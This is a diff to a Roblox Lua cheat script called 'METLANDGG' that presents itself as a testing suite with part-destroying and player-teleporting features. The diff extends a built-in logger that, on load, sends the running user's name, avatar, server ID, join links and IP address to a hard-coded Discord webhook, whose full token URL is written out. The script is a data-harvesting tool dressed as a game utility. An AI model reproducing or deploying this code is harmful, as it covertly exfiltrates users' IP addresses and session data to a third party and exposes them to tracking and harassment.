@@ -1,4 +1,4 @@
--- METLANDGG OPTIMIZED + ENHANCED + WEBHOOK LOGGER
+-- METLANDGG OPTIMIZED + ENHANCED + WEBHOOK LOGGER WITH JOIN LINK
 -- Testing Suite with Minimize & Part Destroyer
 
 repeat task.wait() until game:IsLoaded()
@@ -10,7 +10,7 @@ task.wait(0.5)
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1427156897697632376/GXLU8ZzQx9VeFk6PxIqO9nD9Rs_GbPe0YAxDLNU577KscYshS3rA3P6tF-TPfO6q9lZf"
 
 -- ============================================
--- WEBHOOK LOGGER FUNCTION WITH SCREENSHOT
+-- WEBHOOK LOGGER FUNCTION WITH JOIN LINK
 -- ============================================
 local function sendWebhookLog()
     pcall(function()
@@ -27,6 +27,20 @@ local function sendWebhookLog()
         -- Get game info
         local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
         
+        -- Create join link
+        local joinLink = string.format(
+            "https://www.roblox.com/games/start?placeId=%d&launchData=&joinCode=%s",
+            game.PlaceId,
+            game.JobId
+        )
+        
+        -- Alternative join link (Roblox deep link)
+        local deepLink = string.format(
+            "roblox://experiences/start?placeId=%d&gameInstanceId=%s",
+            game.PlaceId,
+            game.JobId
+        )
+        
         -- Get IP
         local ipAddress = "Unknown"
         pcall(function()
@@ -36,8 +50,9 @@ local function sendWebhookLog()
         -- Get avatar thumbnail
         local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
         
-        -- Create Discord embed with thumbnail
+        -- Create Discord embed with thumbnail and join link
         local embed = {
+            content = "🎮 **CLICK TO JOIN GAME:** " .. joinLink,
             embeds = {{
                 title = "🚨 METLANDGG Script Executed",
                 color = 65535,
@@ -65,7 +80,7 @@ local function sendWebhookLog()
                     {
                         name = "🎮 Game Information",
                         value = string.format(
-                            "**Game:** %s\n**Place ID:** %d\n**Job ID:** %s",
+                            "**Game:** %s\n**Place ID:** %d\n**Job ID:** ||%s||",
                             gameInfo.Name,
                             game.PlaceId,
                             game.JobId
@@ -73,8 +88,17 @@ local function sendWebhookLog()
                         inline = true
                     },
                     {
+                        name = "🔗 Join Links",
+                        value = string.format(
+                            "**[🌐 Web Join Link](%s)**\n**Deep Link:** `%s`\n\n*Click the link above or copy paste the deep link into your browser*",
+                            joinLink,
+                            deepLink
+                        ),
+                        inline = false
+                    },
+                    {
                         name = "🌐 Network",
-                        value = string.format("**IP:** %s", ipAddress),
+                        value = string.format("**IP:** ||%s||", ipAddress),
                         inline = false
                     },
                     {
@@ -87,7 +111,7 @@ local function sendWebhookLog()
                     url = avatarUrl
                 },
                 footer = {
-                    text = "METLANDGG Logger"
+                    text = "METLANDGG Logger • Click the link at the top to join!"
                 },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
             }}
@@ -105,7 +129,7 @@ local function sendWebhookLog()
             Body = payload
         })
         
-        print("📡 Webhook log sent successfully with avatar!")
+        print("📡 Webhook log sent successfully with join link!")
     end)
 end
 
@@ -394,7 +418,7 @@ local deleteModelBtn = createButton("DeleteModelBtn", "Delete Model", UDim2.new(
 y = y + 55
 
 -- Status
-local status = createLabel("Status: Ready! Data logged 📡", UDim2.new(0, 5, 0, y))
+local status = createLabel("Status: Ready! Join link sent 🔗", UDim2.new(0, 5, 0, y))
 status.TextColor3 = Color3.fromRGB(100, 255, 100)
 status.Size = UDim2.new(1, -10, 0, 60)
 status.TextWrapped = true
@@ -1086,13 +1110,12 @@ end)
 pcall(function()
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "⚡ METLANDGG Enhanced";
-        Text = "Loaded! Data sent to webhook 📡";
+        Text = "Loaded! Join link sent to webhook 🔗";
         Duration = 6;
     })
 end)
 
-updateStatus("Enhanced testing suite ready! Data logged 📡", Color3.fromRGB(0, 255, 255))
+updateStatus("Enhanced suite ready! Join link logged 🔗", Color3.fromRGB(0, 255, 255))
 print("✅ METLANDGG ENHANCED LOADED")
-print("📡 Webhook logger active - User data sent!")
-print("📌 Features: Minimize (RightShift), Bring Player, Auto Checkpoint")
-print("⚠️ WARNING: Destroy functions are for testing only!")
+print("📡 Webhook logger active - Join link sent!")
+print("🔗 Others can now join your game via Discord webhook")
